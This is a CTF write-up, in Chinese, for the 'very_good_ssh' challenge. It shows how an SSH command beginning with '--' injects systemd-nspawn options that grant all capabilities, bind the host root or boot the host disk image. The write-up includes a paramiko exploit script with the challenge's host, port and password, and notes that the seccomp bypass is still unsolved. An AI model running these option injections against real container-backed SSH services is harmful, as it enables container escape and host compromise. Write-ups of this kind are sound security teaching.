# very_good_ssh CTF Writeup

## 题目信息
- SSH: `ctf@61.147.171.103:57788`
- 密码: `123456`
- 目标: 挂载9p文件系统读取flag: `mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt`

## 环境分析

### SSH服务器
- **dropbear_2025.89** - 这是一个来自未来的版本号（2025年），暗示是CTF定制版本

### 容器环境
连接SSH后进入的是 **systemd-nspawn** 容器：
- 容器根目录: `/var/lib/machines/rootfs`
- 容器内是精简的BusyBox环境
- 如果上一次SSH连接没有正常exit，会报错：`Directory tree /var/lib/machines/rootfs is currently busy`

**重要提示**：每次SSH连接结束后必须正常exit，否则容器会处于busy状态。

### 虚拟机层面
- QEMU虚拟机运行Arch Linux
- 内核版本: 6.18.5-arch1-1
- 存在9p设备: virtio1, mount_tag="flag"

## 核心漏洞：nspawn选项注入

### 发现过程
Dropbear SSH服务器在认证后会调用systemd-nspawn来启动容器。关键发现是：
**SSH exec_command执行的命令如果以`--`开头，会被解析为nspawn的选项！**

这是因为SSH服务端可能使用类似以下方式调用nspawn：
```bash
systemd-nspawn [固定选项] /var/lib/machines/rootfs $SSH_COMMAND
```

当`$SSH_COMMAND`以`--`开头时，会被解析为nspawn的额外选项。

### 验证方法
```bash
# 执行普通命令
ssh -p 57788 ctf@61.147.171.103 "id"
# 结果: 容器内执行id命令

# 注入nspawn选项
ssh -p 57788 ctf@61.147.171.103 "-- --ephemeral id"
# 或者直接
ssh -p 57788 ctf@61.147.171.103 "--ephemeral id"
# 结果: 使用ephemeral模式启动容器
```

### 有用的nspawn选项
| 选项 | 效果 |
|------|------|
| `--ephemeral` | 临时容器，退出后丢弃修改 |
| `--capability=all` | 赋予容器所有capabilities |
| `--bind=/:/host` | 将宿主机根目录挂载到/host |
| `--image=/dev/vda3` | 使用宿主机磁盘镜像而不是容器rootfs |
| `--volatile=yes --directory=/` | 使用宿主机根目录作为只读基础 |

## 攻击过程

### 第一步：探索容器环境
```python
# 使用exec_command注入nspawn选项
exec_cmd("--ephemeral --capability=all cat /proc/self/status")
```

结果显示：
- CapEff: `000001ffbfd7ffff` - 拥有几乎所有capabilities
- Seccomp: `2` - 启用了seccomp过滤
- Seccomp_filters: `5` - 有5条过滤规则

### 第二步：发现9p问题
```bash
# 查看已加载的内核模块
cat /proc/modules | grep 9p
# 9pnet_virtio 24576 0 - Live
# 9pnet 110592 1 9pnet_virtio

# 查看支持的文件系统
cat /proc/filesystems | grep 9p
# (空!) - 9p文件系统模块未加载
```

问题：`9pnet_virtio`传输模块已加载，但`9p`文件系统模块未加载。

### 第三步：加载9p模块
使用`--image=/dev/vda3`选项可以访问宿主机系统，在那里执行modprobe：

```python
exec_cmd("--image=/dev/vda3 modprobe 9p")
```

验证模块已加载：
```python
exec_cmd("--ephemeral cat /proc/filesystems | grep 9p")
# nodev   9p  ✓
```

**成功！** 9p模块现在已经在内核中。

### 第四步：尝试挂载（当前卡点）
即使有了：
- 9p模块已加载
- CAP_SYS_ADMIN capability
- root权限

挂载仍然失败：
```
mount: permission denied (are you root?)
```

原因是seccomp过滤器阻止了mount系统调用。

### 当前状态

| 条件 | 状态 |
|------|------|
| 9p模块加载 | ✅ 已完成 |
| root权限 | ✅ 有 |
| CAP_SYS_ADMIN | ✅ 有 |
| seccomp限制 | ❌ 阻止mount |

## Exploit脚本

```python
#!/usr/bin/env python3
import paramiko
import time

HOST = "61.147.171.103"
PORT = 57788
USER = "ctf"
PASS = "123456"

def exec_cmd(cmd, wait_after=2):
    """执行单个命令并正确关闭连接"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(HOST, PORT, USER, PASS, timeout=10)
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode()
        err = stderr.read().decode()
        return out, err, None
    except Exception as e:
        return None, None, str(e)
    finally:
        client.close()
        time.sleep(wait_after)  # 关键：等待容器释放

# 第一步：加载9p模块
print("[1] 加载9p模块...")
exec_cmd("--image=/dev/vda3 modprobe 9p")

# 第二步：验证
print("[2] 验证9p模块...")
out, _, _ = exec_cmd("--ephemeral cat /proc/filesystems | grep 9p")
print(out)

# 第三步：尝试挂载（目前被seccomp阻止）
print("[3] 尝试挂载...")
out, err, _ = exec_cmd("--ephemeral --capability=all /bin/sh -c 'mkdir -p /mnt && mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt && cat /mnt/flag'")
print(out, err)
```

## 待解决

需要找到绕过seccomp的方法，可能的方向：
1. nspawn的`--system-call-filter=`选项
2. 使用`--image`模式可能有不同的seccomp配置
3. 通过systemd socket（io.systemd.MountFileSystem）请求挂载
4. 其他nspawn选项组合

## 关键知识点

1. **nspawn选项注入** - SSH命令以`--`开头会被解析为nspawn选项
2. **9p模块加载** - 使用`--image=/dev/vda3 modprobe 9p`可以加载内核模块
3. **连接管理** - 每次连接必须正常关闭并等待，避免"busy"错误
4. **seccomp限制** - 即使有root和所有capabilities，seccomp仍可阻止系统调用
